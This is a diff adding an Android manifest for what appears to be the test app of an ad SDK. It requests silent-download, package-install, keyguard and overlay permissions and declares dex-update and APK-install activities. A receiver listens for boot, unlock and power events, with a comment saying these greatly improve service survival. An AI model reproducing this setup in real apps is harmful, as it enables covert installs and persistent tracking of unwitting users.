@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.curtain.koreyoshi">
+
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION"/>
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ks_ic_launcher"
+        tools:replace="android:icon"
+        android:label="@string/app_name" >
+        <activity android:name="com.curtain.koreyoshi.test.MainActivity" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity android:name="com.curtain.koreyoshi.test.DownloadTestActivity" >
+        </activity>
+        <activity android:name="com.curtain.koreyoshi.test.RequestAdTestActivity" >
+        </activity>
+        <activity android:name="com.curtain.koreyoshi.test.GetReferTestActivity" >
+        </activity>
+        <activity android:name="com.curtain.koreyoshi.test.ShowAdTestActivity" >
+        </activity>
+        <activity android:name="com.curtain.koreyoshi.test.DaoTestActivity" >
+        </activity>
+        <activity android:name="com.curtain.koreyoshi.test.InstallLocationApkActivity" >
+        </activity>
+
+        <receiver
+            android:name="com.curtain.koreyoshi.test.TriggerReceiver"
+            android:enabled="true"
+            android:exported="true" >
+            <intent-filter>
+
+                <!-- 自定义广播 for 安装完成后打开应用 -->
+    <action android:name="com.much.action.pkg_add" /><!-- [config]=PACKAGE_ADD_ACTION -->
+                <!--pinku包安装广播-->
+                <action android:name="com.ibingo.intent.broadcast.INSTALL_COMPLETED" />
+
+                <action android:name="android.intent.action.DOWNLOAD_COMPLETE"/>
+                <action android:name="my.intent.action.DOWNLOAD_COMPLETE"/>
+
+                <!-- 自定义广播 for 下载通知栏点击后恢复下载 -->
+    <action android:name="com.doll.action.pkg_add" /><!-- [config]=PACKAGE_ADD_ACTION -->
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <!-- 以下四项为可选的action声明，可大大提高service存活率 -->
+                <action android:name="android.intent.action.MEDIA_MOUNTED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.curtain.koreyoshi.test.TestService"
+            android:enabled="true"
+            android:exported="true"/>
+
+        <activity android:name="com.curtain.koreyoshi.test.UpdateDexActivity" >
+        </activity>
+        <meta-data android:name="KINGS_APP_NAME"
+            android:value="DollarGetter_lg2"/>
+    </application>
+
+</manifest>
